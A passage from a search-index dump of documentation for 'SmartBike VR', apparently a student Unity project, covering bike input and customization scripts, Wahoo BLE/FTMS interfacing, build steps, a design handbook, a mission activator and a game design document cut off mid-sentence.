System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#axisinput","content":" Uses Unity's built-in Input.GetAxis(&quot;Horizontal&quot;/&quot;Vertical&quot;)Best for development/testing or traditional control schemes    ","version":"Next","tagName":"h3"},{"title":"MQTTInput​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#mqttinput","content":" Subscribes to MQTT topics for: Speed controlLeft/right turns Parses JSON-encoded speed data Designed for hardware integration or IoT-enabled exercise bikes    ","version":"Next","tagName":"h3"},{"title":"XRInput​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#xrinput","content":" Uses XR.InputDevices to read joystick direction from hand-held controllersIdeal for VR motion controllers    ","version":"Next","tagName":"h3"},{"title":"Data Flow Summary​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#data-flow-summary","content":" ","version":"Next","tagName":"h2"},{"title":"Initialization​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#initialization","content":" PlayerController checks input method and selects IPlayerInput.Retrieves or overrides the movement handler (IBikeMover) based on preferences.Calls Init() to link the movement handler with the current bike model.  ","version":"Next","tagName":"h3"},{"title":"Runtime Loop​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#runtime-loop","content":" FixedUpdate(): Gets input via IPlayerInput.GetDirection()Passes input to IBikeMover.HanldeInput()Movement logic is executed (e.g., wheel torque, transform rotation) ","version":"Next","tagName":"h3"},{"title":"Bike Customization System – Architecture & Script Interaction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/bike-setup","content":"","keywords":"","version":"Next"},{"title":"📦 Hierarchy​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#-hierarchy","content":"   ","version":"Next","tagName":"h2"},{"title":"Bike – (Attached to: RoadBikeV5)​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#bike--attached-to-roadbikev5","content":" The Bike class is the core data model and controller for a single bike instance.  Handles: Visual part customization (SetPartColor)IK setup for avatar alignmentSpray paint interaction targets (SetupSprayTargets)Export/import of configuration as BikeData Provides: ToBikeData() → export current customizationLoadBikeData() → apply saved customization    ","version":"Next","tagName":"h3"},{"title":"BikeSelector – (Attached to: Bikes)​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#bikeselector--attached-to-bikes","content":" Responsible for managing multiple bike prefabs  Handles: Switching between different bikes (DisplayBike(int id))Tracking the currently active Bike object (CurrentBike) Acts as a central registry and display handler for the bikes    ","version":"Next","tagName":"h3"},{"title":"SaveLoadBike – (Attached to: Bikes)​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#saveloadbike--attached-to-bikes","content":" Handles persistent save/load and selection logic.  At startup: Loads the last selected bike index via PlayerPrefsDisplays and loads the saved customization When selecting a bike: Updates PlayerPrefsLoads customization data from JSONSubscribes to Bike.OnBikeDataChange to auto-saveInvokes onBikeSelected callback Saves changes to: PlayerPrefs.SetString(&quot;Bike_{id}&quot;, json)    ","version":"Next","tagName":"h3"},{"title":"How They Work Together​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#how-they-work-together","content":" ","version":"Next","tagName":"h2"},{"title":"🔹 Initialization (Start() in SaveLoadBike)​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#-initialization-start-in-saveloadbike","content":" PlayerPrefs.GetInt(&quot;SelectedBike&quot;) retrieves the last selected bike ID.DisplayBike(id) uses BikeSelector to show the correct bike.LoadBikeData(id) fetches saved JSON and applies it to the Bike.  ","version":"Next","tagName":"h3"},{"title":"🔹 Customization Flow​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#-customization-flow","content":" User paints or customizes a part. Bike.SetPartColor() updates the material. If save=true, the bike: Converts the new state to BikeDataTriggers OnBikeDataChangeSaveLoadBike.SaveBikeData() is automatically called  ","version":"Next","tagName":"h3"},{"title":"🔹 Selection Flow​","type":1,"pageTitle":"Bike Customization System – Architecture & Script Interaction","url":"/redback-documentation/docs/project-1/vr/bike-setup#-selection-flow","content":" SelectBike(): Updates selection in PlayerPrefsCalls onBikeSelected to notify listenersEnsures the selected Bike is subscribed for auto-save ","version":"Next","tagName":"h3"},{"title":"Interfacing with Wahoo Devices","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT","content":"","keywords":"","version":"Next"},{"title":"Generic ATTribute Profile (GATT)​","type":1,"pageTitle":"Interfacing with Wahoo Devices","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT#generic-attribute-profile-gatt","content":" GATT is a BLE protocol and an extension to the base Attribute (ATT) protocol. It uses a client-server relationship, where only a single client may be connected to the server at any time. Values are stored in a lookup table on the server side, which the client may request to read or write to depending on the value’s properties. These values are called characteristics and are covered in more detail in another part of this document. GATT establishes a large set of generic profiles (collections of services and characteristics) for common devices and uses of ATT, meaning that we can expect devices built for GATT to behave in certain ways with pre-existing characteristics and services.  ","version":"Next","tagName":"h2"},{"title":"Profiles, Services & Characteristics​","type":1,"pageTitle":"Interfacing with Wahoo Devices","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT#profiles-services--characteristics","content":"   Profiles are standardised generic collections of services and characteristics. They are standardised by the Bluetooth standardisation organisation - Bluetooth SIG - and cover a wide range of use cases including fitness machines.  Services are groupings of characteristics under a common context. A service has a 16-bit or 128-bit UUID which identifies it and its characteristics.  Characteristics are the values which can be read or written to and have their own 16-bit or 128-bit UUIDs. They can also have descriptors which provide more context of the characteristic’s use.  In addition to the generic services and characteristics, manufacturers may also include custom services and characteristics. These custom ones use the 128-bit UUIDs whereas the generic ones use the 16-bit UUIDs.  ","version":"Next","tagName":"h3"},{"title":"Indication & Notification​","type":1,"pageTitle":"Interfacing with Wahoo Devices","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT#indication--notification","content":" As GATT is a slave-master relationship (where the client is master) response and acknowledgement from the server must be explicitly authorised by the client. So, if we want to be updated when a characteristic on the server is updated, we must enable notification on that characteristic. Likewise, to receive acknowledgements of success or error on a write, we need to enable indications for that characteristic. The library we use seems to automatically enable indications but this needs to be further investigated.  ","version":"Next","tagName":"h3"},{"title":"Fitness Machine Service (FTMS)​","type":1,"pageTitle":"Interfacing with Wahoo Devices","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT#fitness-machine-service-ftms","content":" The FTMS generic profile deals specifically with fitness machines like the Wahoo devices and the details of their official generic profile can be found here including generic services and characteristics.  ","version":"Next","tagName":"h2"},{"title":"Control Point​","type":1,"pageTitle":"Interfacing with Wahoo Devices","url":"/redback-documentation/docs/project-1/iot/technical-background-information/GATT#control-point","content":" As these machines may also need to be controlled by a client to execute some sort of functions, for instance increasing the incline on the climber, a control point characteristic is exposed for this purpose.    The FTMS control point characteristic enables control over the FTMS functions. Functions have unique operation codes (Op Codes) which are used to request they be executed. To send commands to the control point, the client must first subscribe to indications for the control point and then request control over the control point by using the Request Control Op Code 0x00. If control is given, then other functions can be executed by writing their Op Code and parameter values to the control point. Control over the control point can also be reset by writing the Op Code 0x01. ","version":"Next","tagName":"h3"},{"title":"How to update the APK and EXE files","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide","content":"","keywords":"","version":"Next"},{"title":"Step 1:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-1","content":" Open Unity Hub and click on ‘Installs’.    ","version":"Next","tagName":"h3"},{"title":"Step 2:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-2","content":" Click on the cog icon to the top right of your Unity install. Then click on ‘Add modules’.    ","version":"Next","tagName":"h3"},{"title":"Step 3:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-3","content":" A new window should open and there will be many different modules. Install the ones that are highlighted as they are required to complete the build files.    ","version":"Next","tagName":"h3"},{"title":"Step 4:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-4","content":" After installing the modules, open your updated game file. Now open the build settings by clicking ‘File’ &gt; ‘Build settings’.    ","version":"Next","tagName":"h3"},{"title":"Step 5:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-5","content":" Click on ‘Player settings’ in the bottom left of the new window.    ","version":"Next","tagName":"h3"},{"title":"Step 6:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-6","content":" Update the version number so the build files are different from the previous builds. If this isn’t updated, it can cause issues. Also ensure that the product name doesn’t contain any spaces in the name. After updating the version number and checking the product name, the window can be closed.    ","version":"Next","tagName":"h3"},{"title":"Step 7:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-7","content":" Highlight ‘Windows, Mac, Linux’ in the platform options, then start the build process by clicking ‘Build’ in the bottom-right corner of the window. You will need to choose a location to save the build files. It’s recommended to create a new folder to keep all the files organised and in one place. Ensure this folder is saved in a memorable location so the files can be easily accessed and shared later. This step generates the EXE file.  important This process can take a considerable amount of time, depending on the specifications of your device or PC. The build may take several hours to complete. Plan ahead and avoid leaving this step until the last minute. It’s best to set aside some time to leave it running a while.    ","version":"Next","tagName":"h3"},{"title":"Step 8:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-8","content":" After completing step 7, this prompt should appear. Click ‘Yes’. The files will begin building.    ","version":"Next","tagName":"h3"},{"title":"Step 9:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-9","content":" After completing the first build, click on ‘Android’. You will need to click ‘switch platform’ to get it ready to be built. After switching the platform, you will need to click ‘Build’ and select a file location to save the build files again. This step generates the APK file.  important Again, this process can take a considerable amount of time, depending on the specifications of your device or PC. Plan ahead and avoid leaving this step until the last minute. It’s best to set aside some time to leave it running a while.    ","version":"Next","tagName":"h3"},{"title":"Step 10:​","type":1,"pageTitle":"How to update the APK and EXE files","url":"/redback-documentation/docs/project-1/vr/apk-exe-build-guide#step-10","content":" Create a new folder in the project 1 files with the trimester and year you are studying this unit. Upload the APK and EXE files to your new folder so they can be accessed by everyone.   ","version":"Next","tagName":"h3"},{"title":"Outline Component","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/outline-effect","content":"","keywords":"","version":"Next"},{"title":"Features​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#features","content":" Outline color supports HDR (glow with Bloom)Optional animated gradient color via AnimationCurveOption to pre-bake smooth normals for performanceMultiple outline modes including silhouette-only and visible-onlyAutomatically adds necessary materials at runtime  ","version":"Next","tagName":"h2"},{"title":"🛠 Usage​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#-usage","content":" ","version":"Next","tagName":"h2"},{"title":"Basic Setup​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#basic-setup","content":" Add the Outline component to a GameObject. It will automatically:  Detect child renderersAdd outline materials at runtimeApply default outline color and width  ","version":"Next","tagName":"h3"},{"title":"Outline Modes​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#outline-modes","content":" Control how the outline is rendered:  Mode\tDescriptionOutlineAll\tAlways visible, even through walls OutlineVisible\tOnly visible when the object is visible OutlineHidden\tOnly visible when the object is behind something OutlineAndSilhouette\tVisible and includes silhouette outline SilhouetteOnly\tOnly renders silhouette, not full outline  ","version":"Next","tagName":"h3"},{"title":"Animated Gradient​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#animated-gradient","content":"   Set Color Type to GradientAssign a GradientDefine an AnimationCurve (typically goes from 0 to 1)Set the end node of the AnimationCurve to loop or ping pong to run indefinetilyAdjust Animation Speed  Bloom Post-processing is recommended for glowing outlines with HDR colors.  ","version":"Next","tagName":"h3"},{"title":"Smooth Normals Baking (Optional)​","type":1,"pageTitle":"Outline Component","url":"/redback-documentation/docs/project-1/vr/outline-effect#smooth-normals-baking-optional","content":" For improved performance:  Enable Precompute Outline in the InspectorSmooth normals will be baked in the editor  If disabled, smooth normals are calculated at runtime on Awake() (may cause lag on large meshes). ","version":"Next","tagName":"h3"},{"title":"Design Handbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/design-handbook","content":"","keywords":"","version":"Next"},{"title":"Assets still need to work on​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#assets-still-need-to-work-on","content":" ","version":"Next","tagName":"h2"},{"title":"1. Road Module (Complete)​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#1-road-module-complete","content":" It is necessary to construct road modules with sufficient shapes for road laying, such as straight sections, intersections, and T-junctions. And different road conditions are required, such as paved and unpaved roads.  a) Appropriate and uniform size is required.  b) Assets need to be prefabricated into unit prefabs.  ","version":"Next","tagName":"h3"},{"title":"2. Bike and Custom Painting​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#2-bike-and-custom-painting","content":" Road bikes (Complete)Mountain bikes (Complete)Women's bikes (Complete)Custom painting in the Garage Scene (Complete) (Due to the bike model update, all setting of bike color change needs to be adjusted in the Garage Scene)    Bike Parts Name  ","version":"Next","tagName":"h3"},{"title":"3. Map Resources​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#3-map-resources","content":" Vegetation (Need to Work on). Create temperate shrubs and trees. The Assets folder contains a Plants folder that includes plants commonly found around tropical desert areas.    Figure 1 Plants Assets  More types of building (Complete)There are only two shapes of buildings placed in the city scene. These need to be replaced with different buildings from the building assets folder.Special locations include mission locations, interest exploration points, buildings, and environments.Teleport portal needs animation.The map is designed for coastal towns in southeastern Australia, according to the different areas in the map, building modeling needs to consider the different distribution of buildings in different areas for differentiated differentiation.    Figure 2 Planned Map    Figure 3 Current Map  ","version":"Next","tagName":"h3"},{"title":"4. UI​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#4-ui","content":" Remake a better customized bike interface. (In progress)Remake a better HUD to display scores and other data.    Figure 4 In-game UI (City Scene)  Add mission description when selecting a mission in Mission Board. (Complete)    Figure 5 In-game UI (Garage Scene)  ","version":"Next","tagName":"h3"},{"title":"5. Garage​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#5-garage","content":" ","version":"Next","tagName":"h3"},{"title":"6. Animation​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#6-animation","content":" Update: Wheel rotation and handlebar steering during cycling. (Pending, find the updated PlayerController.cs script in the pull request #74, it is currently not supported with MQTT, Needs improvement.)Update: The turning pivot of the bicycle should be on the front not middle of the bicycle. (Completed)Add: animation between legs, crankarm and peddler.  ","version":"Next","tagName":"h3"},{"title":"7. Special effects​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#7-special-effects","content":" Add special effects of bicycles driving on different road surfaces (contains sound)Add a ring bell function (sound).Add bicycle chain sound.Add sound effects when updating mission status.Add a blur filter when speed is boosted.Add visual and sound effects when passing through a teleporter.  ","version":"Next","tagName":"h3"},{"title":"8. Style and style reference​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#8-style-and-style-reference","content":" The overall style tends to be realistic, and attention should be paid to the adjustment of shaders and materials during production, especially the parameters or textures of metallicity.  BuildingThe architectural style of the building complex can be made according to the common styles in Melbourne. It should be noted that due to the geographical factors set, there will not be tall buildings or skyscrapers, and it needs to comply with the geographical setting of the town. In the center (dark gray part), there should be some relatively large buildings, which should be in line with the actual design infrastructure buildings, such as fire stations, hospitals, schools, etc.  Building models should be packed and delete redundant building models. Although different building models are already in the asset s folder, we need to replace the current game building with them.    Figure 6 Building Models Assets  Urban design reference !   When designing, attention should be paid to a certain mix of new and old buildings, but the overall style of the town should maintain a relatively old and rustic style. In residential areas, the scale of houses should be maintained at a moderate level and there should be no large-scale buildings.  Modern design can be carried out for facilities such as hospitals, schools, etc. Colorful designs can be enriched to make the town more vibrant.  ","version":"Next","tagName":"h3"},{"title":"Exist 3D Assets​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#exist-3d-assets .unnumbered","content":" ","version":"Next","tagName":"h2"},{"title":"1.Bicycle​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#1bicycle","content":" File's location: (Assets\\Models\\Bicycles)  Notice: There are a few old versions of RoadBike model in the folder, just in case if new model has any bugs.    Old Bike Assets  Bicycles are used for NPCs that automatically ride on the road and also for the player. Currently, there are three types of bicycles.  Bicycle_1 (Currently used by NPC bike, poorly made, recommend change to WomenBikeV2 in the future.)    Figure 7 Bicycle_1  Bicycle_2: (Currently used by NPC bike, poorly made, recommend change to MountainBikeV2 in the future.)    Figure 8 Bicycle_2  RoadBikeV7: Currently used by player    Figure 9 RoadBikeV7  WomenBikeV3: (Completely remake bike model base on Bicycle_1, perform same functionality as RoadBikeV7)    Figure 10 WomenBikeV2  MountainBikeV2: (Completely remake bike model base on Bicycle_2, perform same functionality as RoadBikeV7)    Figure 11 MountainBikeV2  ","version":"Next","tagName":"h3"},{"title":"2.Building in the scene​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#2building-in-the-scene","content":" Files located: (Assets\\Models\\Buildings)  Building 1    Figure 12 Building 1  Building 2    Figure 13 Building 2  2StoryCafe    Figure 14 Building 3  3StoryCafe    Figure 15 Building 4  3StoryGame    Figure 16 Building 5  3StoryHome    Figure 17 Building 6  3StoryHotel    Figure 18 Building 7  3StoryPlace    Figure 19 Building 8  3StoryStore    Figure 20 Building 9  3StoryVariety    Figure 21 Building 10  OutdoorPlace    Figure 22 Building 11  SmallOffice    Figure 23 Building 12  BikeCafe    Figure 24 Building 13  BikeShop    Figure 25 Building 14  Gate    Figure 26 Gate  ","version":"Next","tagName":"h3"},{"title":"3.Collectable​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#3collectable","content":" Files located: (Assets\\Models\\Pickups)  Collectibles include coins and stars. A silver coin will add 1 point, a gold coin will add 2 points, and a star will add 5 points. Players can use points to buy an apple at the apple shop.  Silver coin    Figure 27 Silver Coin  Gold coin    Figure 28 Gold Coin  Star    Figure 29 Star  ","version":"Next","tagName":"h3"},{"title":"4.Road​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#4road","content":" City Road    Figure 30 City Road  Race Road    Figure 31 Race Road  ","version":"Next","tagName":"h3"},{"title":"5.Boost Ramp​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#5boost-ramp","content":" Files located: (Assets\\Models\\Interaction)  When the player rides over a boost ramp, their speed will increase for a few seconds. Multiple speed boosts can accumulate.    Figure 32 Boost Ramp  ","version":"Next","tagName":"h3"},{"title":"6.Teleport Portal​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#6teleport-portal","content":" The player can ride into the teleporter to teleport back to the Garage scen (Model needs improve and animation).  !Teleport](img/Teleport.png)  Figure 33 Teleport Portal  ","version":"Next","tagName":"h3"},{"title":"7.Apple Shop​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#7apple-shop","content":" Files located: (Assets\\Models\\Market Stalls)  The player can use their points to buy apples.    Figure 34 Apple Shop  ","version":"Next","tagName":"h3"},{"title":"8.Avatars​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#8avatars","content":" Files located: (Assets\\Models\\Avatar) The characters players can select and have ride on the bike.  Male Avatar    Figure 30 Male Avatar  Female Avatar    Figure 31 Female Avatar  ","version":"Next","tagName":"h3"},{"title":"9.Trash Bin​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#9trash-bin","content":" Files located: (Assets\\Models\\Other)    Figure 35 TrashBinGreen    Figure 36 TrashBinRed  ","version":"Next","tagName":"h3"},{"title":"10.Others​","type":1,"pageTitle":"Design Handbook","url":"/redback-documentation/docs/project-1/vr/design-handbook#10others","content":" Files located: (Assets\\Models\\Other)    Figure 37 BustopV2    Figure 38 ParkBench ","version":"Next","tagName":"h3"},{"title":"Using the Mission Activator","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/mission","content":"","keywords":"","version":"Next"},{"title":"How To Create Missions And Add Them Into The Board​","type":1,"pageTitle":"Using the Mission Activator","url":"/redback-documentation/docs/project-1/vr/mission#how-to-create-missions-and-add-them-into-the-board","content":" After working on the mission activator as I go from the previous leader, I am noting down tips and tricks as I go to ensure smooth sailing in creating scripts for missions without any problems. Any difficulties that have been solved throughout the process will be recorded so juniors will not make the same mistakes. Anyone else is free to note any problems in relation with their own scripts being used in the mission activator.  This is with the assumption that you already created your own mission scripts in the Unity Project and need to add them to the mission activator. To start off, here is the video that will help you understand at first:  Unity Mission Activator  Before you start working on any missions, note that you should be able to attach your script in an empty object and it should still function correctly otherwise you are going to have to upgrade it that way later which is more work for you.  If you have already added the missions into the activators and found out that your script is not working compared to say, adding the script directly to the bike as a means to testing it out, there are a few reasons for that:  For the bike, there is a need to collect items, press buttons or bump into things that usually when the script is directly added into the bike for mission testing purposes, any collision function is used such as OnTriggerEnter for the interaction. However, that will only work when the script is added directly to the bike. With the Mission Activator using an empty object to store the mission script, alternate ways can be used depending on the mission's content in the update function.To collect items, finding game objects with tags such as FindGameObjectsWithTag() and FindWithTag() functions for array and a singular item respectively as well as using activeSelf for the gameObject that is set to false to indicate the item's removal thanks to the bike is a good start for an alternate way from the collision function but still a guideline depending how the mission is created. An example code for item collection using finding game object with tags: //Finding an array of stars. Game tag made at the star prefab as 5. GameObject[] starFind = GameObject.FindGameObjectsWithTag(&quot;5&quot;); //Once the array reaches 0, all stars are collected. if(starFind.Length == 0) { Debug.Log(&quot;All stars are found&quot;); SetActives are also important parts in mission because they can detect the success of the mission by the object's in the area. To understand the meaning better, please refer to previous missions such as Mission 1 and Mission 5 in Unity.  When testing the missions, there are a few things with the mission activator that you should consider:  Make sure that all empty objects with missions are placed inside Objectives &gt; Missions for the missions to work. Any game object (not prefab) should be added alongside your mission empty objects so they can be used such as Mission 1 with robot and b (non prefab game objects). If robot and b were put anywhere else, they will black out and not work.Make sure that there are missions on the list. If the mission list is empty, they will run all the missions in the file as the mission list serves as an activator / deactivatorWhen making missions in different scenes, make sure the Objectives from City Scene is copied to the new scene, if haven't already, and from the Mission Activator script, make sure that the list has the same number of elements in each scene. it is OK for the element to be blank for the particular mission that is on a specific scene.For point above, only work on any missions in CityScene until other scenees are stated useable for testing purposes (Pending for other scenes)  ","version":"Next","tagName":"h2"},{"title":"Future Development​","type":1,"pageTitle":"Using the Mission Activator","url":"/redback-documentation/docs/project-1/vr/mission#future-development","content":" A modification has been made to the Mission_Activator script in that it will now find all Missions in a scene and automatically add them to the activation system.  To create your Mission, instead of extending from MonoBehaviour like you would normally, the following base class has been created that handles a way to find missions and have the name and number stored:  public class Mission : MonoBehaviour { public virtual int MissionNumber =&gt; 0; public virtual string MissionName =&gt; &quot;Not Set&quot;; }   To create a child class that will be found by the activator, use code similar to below which is implemented in the Mission1 script:  public class Mission1 : Mission { public override string MissionName =&gt; &quot;Collect the Star&quot;; public override int MissionNumber =&gt; 1;  ","version":"Next","tagName":"h2"},{"title":"Game Design Document","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/game-design","content":"","keywords":"","version":"Next"},{"title":"1. Game Overview​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#1-game-overview","content":" ","version":"Next","tagName":"h2"},{"title":"1.1. Game Concept​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#11-game-concept","content":" Title: SmartBike VR  Theme: Exergaming, health, VR, Open-World Exploration, Competition, Sports and Racing  Catchphrase: Ride, Race, and Conquer Reality in SmartBike VR: Where Your Pedals Power Your Adventure  &quot;SmartBike VR&quot; is a virtual reality experience designed to gamify cycling and encourage physical exercise. The game integrates a seamless system of linking smart indoor exercise bikes, currently limited to Wahoo KICKR Core/Climb, with a Unity-built game for controlling the in-game cycling experience and supports Meta Quest 2/3 for immersive VR gameplay. The game also offers a synchronized view on both VR headsets and external monitors, providing a dynamic and engaging experience for both players and spectators. Multiplayer support is provided through Photon Fusion, letting players cycle and compete in a shared virtual world.  ","version":"Next","tagName":"h3"},{"title":"1.2. Target Audience​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#12-target-audience","content":" The SmartBike VR system is built for:  Fitness enthusiasts who are looking to gamify their exercise routinesCasual gamers who are interested in health and wellnessCompetitive cyclists seeking a virtual training environmentVR gamers looking for an immersive and active experience  ","version":"Next","tagName":"h3"},{"title":"1.3. Platform​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#13-platform","content":" Meta Quest 2/3: &quot;SmartBike VR&quot; is targetted specifically at the Meta Quest headsets and their ability to communicate wirelessly with a physical bike. It allows the player to install the game on their headset, connect to their bike over bluetooth and then explore a virtual world in the comfort of their own home.  SteamVR: &quot;SmartBike VR&quot; can be used in a tethered mode for PC gaming platforms which utilizes SteamVR as the technology framework to enable virtual reality gameplay. The tethered mode will allow for a simultaneous VR experience, but also be able to remove the headset and experience the game in an onscreen mode. This means that players who own compatible VR headsets and use the Steam platform could access and play &quot;SmartBike VR&quot; through the SteamVR platform.  PlayStation (PS4, PS5): With the PS4/PS5 both having a PSVR system, expanding &quot;SmartBike VR&quot; for PlayStation consoles (PS4 and PS5) can capitalize on the platform's extensive player base, spanning casual gamers to enthusiasts, and its well-established VR support through PlayStation VR. With millions of users and the potential for diverse demographics, the game can attract a broad audience. That the PlayStation also utilizes bluetooth connectivity, the ability to connect wirelessly to your physical bike is still able to occur and add that virtual workout to your PlayStation gaming experience.  ","version":"Next","tagName":"h3"},{"title":"1.4. Elevator Pitch​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#14-elevator-pitch","content":" Embark on an immersive journey of adventure and fitness in 'SmartBike VR.' Pedal your way through an expansive VR world, where your stationary cycling powers the action. Engage in thrilling races across diverse landscapes, embrace the challenge of delivery quests in a free roam map, and collect valuable data using integrated sensors. With the power of VR, 'SmartBike VR' invites players of all backgrounds to experience the fusion of gaming and exercise, while the potential for console platforms like PlayStation and Xbox ensures a broad reach, promising a new era of interactive and healthy entertainment.  ","version":"Next","tagName":"h3"},{"title":"1.5. Distribution Method​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#15-distribution-method","content":" Subscription model with a free-to-play mode.  &quot;SmartBike VR&quot; will be available through the Steam Store, Meta Store and directly on a Meta Quest headset. It will be available to download for free with a basic version allowing the player to experience the game without a cost. If further content is wanted to be experienced, this will be done as a pay-to-play model with a small monthly cost. This monthly cost system is the standard fare of exercise-based virtual reality experience and by keeping the cost low it allows a consistent revenue for the team.  ","version":"Next","tagName":"h3"},{"title":"2. Game Mechanics​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#2-game-mechanics","content":" ","version":"Next","tagName":"h2"},{"title":"2.1. Core Pillar of Gameplay​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#21-core-pillar-of-gameplay","content":" &quot;Physical Engagement&quot; as a core pillar of gameplay in &quot;SmartBike VR&quot; revolves around the active involvement of players' physical movements to control their in-game avatars and impact their performance. This gameplay is central to the game's concept of combining exercise with virtual reality gaming.  Players use their real bicycles, equipped with sensors, to simulate cycling within the virtual world. As players pedal on their stationary bikes, their movements are translated into in-game actions, allowing them to control the speed and direction of their avatars. Pedaling speed determines the avatar's movement speed in the virtual environment. Players can control the direction of their avatar by steering the handlebars of their real bicycle.  Just like in real cycling, players need to manage their energy levels. Pedaling faster consumes more energy, while slowing down conserve’s energy. This dynamic encourages players to strategize when to speed up and when to maintain a steady pace. Players can use their physical engagement to strategically navigate races. For example, they might pedal intensely during a sprint challenge and then ease up during downhill sections to recover energy.  The physical engagement element adds a layer of challenge to navigating obstacles within the virtual world. Players need to adjust their pedaling intensity and direction to avoid obstacles and hazards effectively. The more players engage physically, the more they can improve their fitness levels and in-game skills. Regular physical activity can result in better performance, faster completion times, and increased stamina. By intertwining physical movement with gameplay, &quot;SmartBike VR&quot; serves as a motivational tool for exercise. Players are encouraged to stay active while enjoying a virtual cycling experience.  Physical engagement aligns with the game's focus on promoting a healthier lifestyle. Players can experience cardiovascular exercise, improved stamina, and other health benefits while having fun. Physical engagement enhances the immersion by making players feel more connected to 